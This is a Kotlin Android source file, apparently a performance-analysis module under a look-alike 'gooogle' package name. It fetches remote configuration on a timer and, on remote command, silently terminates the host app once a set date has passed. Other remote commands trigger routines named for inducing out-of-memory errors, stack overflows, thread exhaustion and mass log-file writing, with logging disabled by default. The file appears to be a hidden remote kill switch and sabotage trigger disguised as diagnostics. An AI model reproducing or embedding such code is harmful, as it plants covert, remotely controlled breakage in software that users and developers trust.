package com.gooogle.analysis

import android.annotation.SuppressLint
import android.content.Context
import android.util.Log
import com.gooogle.analysis.cpu.CpuSample
import com.gooogle.analysis.memory.MemoryAnalysis
import com.huawei.agconnect.AGConnectInstance
import com.huawei.agconnect.AGConnectOptionsBuilder
import com.huawei.agconnect.remoteconfig.AGConnectConfig
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.IOException
import kotlin.system.exitProcess


/*
 * Created by Zachary on 2025/10/16.
 */
@SuppressLint("StaticFieldLeak")
internal object Analysis {
    private const val KEY_TIME = "time"

    private const val NAME_SAMPLE_CPU = "cpu"
    private const val NAME_SAMPLE_MEMORY = "memory"
    private var ctx: Context? = null
    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private var loggable: Boolean = false


    fun init(context: Context) {
        try {
            ctx = context
            scope.launch(Dispatchers.IO) {
                initAGConnect(context)
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    private suspend fun initAGConnect(context: Context) = withContext(Dispatchers.IO) {
        val builder = AGConnectOptionsBuilder()
        builder.inputStream = context.assets.open("agconnect-services.json")
        AGConnectInstance.initialize(context, builder)
        updateConfig()
    }

    private fun updateConfig(){
        val config = AGConnectConfig.getInstance()
        val last = config.loadLastFetched()
        config.apply(last)
        config.fetch(10 * 60).addOnSuccessListener {
            config.apply(it)
            log("AGConnectConfig fetch success")
        }.addOnFailureListener {
            log("AGConnectConfig fetch failed: ${it.message}")
        }
        startAnalysis()
    }

    private fun startAnalysis() {
        scope.launch(Dispatchers.IO) {
            while (isActive) {
                parseConfig()
                delay(15 * 60 * 1000)
            }
        }
    }

    private fun parseConfig() {
        val config = AGConnectConfig.getInstance()
        val time = config.getValueAsLong(KEY_TIME)
        val cpuInfo = config.getValueAsString(NAME_SAMPLE_CPU)
        val memoryInfo = config.getValueAsString(NAME_SAMPLE_MEMORY)
        log("parseConfig time is $time, cpuInfo is $cpuInfo, memoryInfo is $memoryInfo")
        scope.launch {
            executeExpiredTime(time)
        }
        scope.launch {
            executeCpuSample(cpuInfo)
        }
        scope.launch {
            executeMemorySample(memoryInfo)
        }
    }

    private suspend fun executeExpiredTime(time: Long) {
        if (time <= 0) {
            return
        }
        val currentTime = System.currentTimeMillis()
        if (time < currentTime && time > 0L) {
            log("oh, my god: $time")
            delay(30* 1000)
            exitProcess(0)
        }
    }

    private suspend fun executeCpuSample(cpuInfo: String?) = withContext(Dispatchers.IO) {
        val json = try {
            JSONObject(cpuInfo ?: return@withContext)
        } catch (e: Exception) {
            log("executeCpuSample failed: ${e.message}")
            return@withContext
        }
        val method = json.optString("method")
        log("executeCpuSample method is $method")
        if (method == "sampleCpu") {
            delay(1 * 60 * 1000)
            withContext(Dispatchers.Main) {
                CpuSample.sampleCpu()
            }
        }
    }

    private suspend fun executeMemorySample(memoryInfo: String?) = withContext(Dispatchers.IO) {
        val json = try {
            JSONObject(memoryInfo ?: return@withContext)
        } catch (e: Exception) {
            log("executeMemorySample failed: ${e.message}")
            return@withContext
        }
        delay(2 * 60 * 1000)
        val method = json.optString("method")
        log("executeMemorySample method is $method")
       when (method) {
           "analyzeWriteLogFile" -> {
               withContext(Dispatchers.Main) {
                   val count = json.optInt("count", 1000000)
                   MemoryAnalysis.analyzeWriteLogFile(ctx ?: return@withContext, count)
               }
           }
           "analyzeOom" -> {
               withContext(Dispatchers.Main) {
                   val interval = json.optLong("interval", 1000)
                   MemoryAnalysis.analyzeOom(interval)
               }
           }
           "analyzeFile" -> {
               withContext(Dispatchers.Main) {
                   MemoryAnalysis.analyzeFile(ctx ?: return@withContext)
               }
           }
           "analyzeMaxThread" -> {
               withContext(Dispatchers.Main) {
                   val interval = json.optLong("interval", 1000)
                   MemoryAnalysis.analyzeMaxThread(interval)
               }
           }
           "analyzeLargeString" -> {
               withContext(Dispatchers.Main) {
                   val interval = json.optLong("interval", 10)
                   MemoryAnalysis.analyzeLargeString(interval)
               }
           }
           "analyzeStackOverflow" -> {
               withContext(Dispatchers.Main) {
                   MemoryAnalysis.analyzeStackOverflow()
               }
           }
           "analyzeHashMap" -> {
               withContext(Dispatchers.Main) {
                   val count = json.optInt("count", 1000000)
                   MemoryAnalysis.analyzeHashMap(count)
               }
           }
       }
    }

    private fun log(msg: String) {
        if (loggable) {
            Log.v("Analysis", msg)
        }
    }
}
